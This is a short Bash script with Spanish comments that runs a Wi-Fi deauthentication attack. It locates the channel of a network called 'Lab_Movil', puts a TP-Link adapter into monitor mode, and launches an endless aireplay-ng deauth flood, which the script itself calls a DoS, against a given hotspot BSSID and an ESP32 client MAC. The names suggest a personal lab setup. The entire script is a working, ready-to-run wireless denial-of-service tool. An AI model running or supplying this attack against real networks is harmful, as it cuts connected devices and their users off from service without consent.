#!/bin/bash

# Configuración
INT_INTERNA="wlo1"
INT_EXTERNA="wlxccbabd6179b5"
BSSID_MOVIL="96:69:97:89:e2:90"
MAC_ESP32="58:8C:81:20:63:E4"
SSID_OBJETIVO="Lab_Movil"

echo "[+] Paso 1: Localizando canal de $SSID_OBJETIVO usando $INT_INTERNA..."

# Forzamos un escaneo rápido
nmcli dev wifi rescan

# Buscamos el canal por el nombre de la red (SSID)
CANAL=$(nmcli -t -f SSID,CHAN dev wifi list | grep "^$SSID_OBJETIVO:" | cut -d: -f2 | head -n 1)

if [ -z "$CANAL" ]; then
    echo "[-] Error: No se encuentra la red '$SSID_OBJETIVO'. Revisa si el hotspot sigue activo."
    exit 1
fi

echo "[+] Red detectada en el CANAL: $CANAL"

# Paso 2: Preparar la TP-Link (Externa) de forma limpia
echo "[+] Configurando $INT_EXTERNA en modo monitor en canal $CANAL..."
sudo ip link set $INT_EXTERNA down
sudo iw dev $INT_EXTERNA set type monitor
sudo ip link set $INT_EXTERNA up
sudo iw dev $INT_EXTERNA set channel $CANAL

# Paso 3: Ataque directo
echo "[+] Lanzando ataque de desautenticación (DoS)..."
# Usamos -D para saltar el escaneo de beacons ya que fijamos el canal nosotros
sudo aireplay-ng -0 0 -a $BSSID_MOVIL -c $MAC_ESP32 -D $INT_EXTERNA



